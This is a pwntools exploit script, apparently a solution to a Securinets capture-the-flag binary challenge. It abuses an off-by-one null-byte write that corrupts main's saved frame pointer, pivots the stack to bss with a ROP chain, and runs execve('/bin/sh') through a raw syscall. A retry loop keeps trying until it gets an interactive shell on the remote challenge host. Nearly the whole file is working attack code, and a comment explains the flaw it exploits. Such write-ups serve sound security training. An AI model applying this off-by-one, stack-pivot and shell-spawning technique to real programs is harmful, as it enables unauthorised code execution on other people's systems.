#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import time

from pwn import *

elf = context.binary = ELF("./main")


def start(argv=[], *a, **kw):
    # pwn.ctf.securinets.tn 7777
    host = args.HOST or 'pwn.ctf.securinets.tn'
    port = int(args.PORT or 7777)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

read = elf.symbols["read"]

writable = 0x4ab000

pop_rdi = 0x0047894f
pop_rsi = 0x004723b9
pop_rdx_rbx = 0x0047290c
pop_rbp = 0x00478547
pop_rax = 0x00463594
syscall = 0x0047508f
leave_ret = 0x0047610d
ret = leave_ret + 1

# build second ROP chain on bss and stack pivot to bss
payload_1 = b""
payload_1 += flat(
    pop_rdi, 0,
    pop_rsi, writable,
    pop_rdx_rbx, 0x200, 0,
    read,
    pop_rbp, writable,
    leave_ret
)

pad = (0x90 - len(payload_1)) // 8

# ret slide
payload_1 = flat([ret] * pad) + payload_1

payload_2 = flat(
    b"/bin/sh\x00",
    pop_rdi, writable,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    pop_rax, 0x3b,
    syscall
)

"""
Off-by-one error on `readInput` if input is exactly the length of the argument

e.g., `readInput(addr, 0x90)`, if our input is 0x90 bytes long, this function
sets `[addr+0x90+0x1]` to NULL which is the lowest byte of `readInput`'s' old
`rbp`, or in other words `main`'s `rbp`

with this byte overwritten, pray that when `main` return, it returns to our
`description` input
"""


while True:
    io = start()

    io.sendline(b"2")
    io.sendline(payload_1)

    io.sendline(b"3")
    try:
        resp = io.recvline(timeout=1)
    except EOFError:
        io.close()
        quit()

    if b"1. Set username" in resp:
        io.close()
        continue

    io.send(payload_2)
    try:
        io.recvline(timeout=1)
    except EOFError:
        io.close()
        continue
    io.interactive()
